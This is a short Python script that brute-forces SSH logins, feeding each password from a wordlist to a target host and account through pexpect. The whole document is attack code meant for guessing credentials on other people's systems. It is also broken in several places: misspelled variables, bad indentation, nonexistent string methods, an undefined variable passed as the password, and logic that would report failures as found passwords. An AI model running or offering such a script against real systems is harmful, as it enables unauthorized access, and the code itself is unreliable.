#bruteforces ssh login
#!/usr/bin/python

import pexpect
from termcolor import colored 

PROMPT = ["# ", ">>> ", "> ", "\$ "]

def send_command(chuld, command):
	child.sendline(command)
	child.expect(PROMPT)
	print(child.before)

#this function automates ssh login
def connect(user, host, password):
	ssh_newkey = "are you sure you want to continue connecting?"
	connStr = "ssh " + user + "@" + host
	child = pexpect.spawn(connStr)
	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, "[P|p]assword: "])
	if ret == 0:
		print("[-] error connecting")
		return
	if ret == 1:
		child.sendline("yes")
		ret = child.expect([pexpect.TIMEOUT, "[P|p]assword: "])
			if ret == 0:
				print("[-] error connecting")
				return
	child.sendline(password)
	child.expect(PROMPT, timeout = 0.5)
	return child
	
def main():
	host = input("enter target IP: ")
	user = input("enter target user account: ")
	file = open("passwordList.txt", "r")
	for password in file.readLines():
		password = password.script("\n")
		print(password)
		try:
			child = connect(user, host, passwordList)
			print(colored("[+] password FOUND: " + password, "green"))
		except:
			print(colored("[x] no match: " + password, "red"))
main()
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	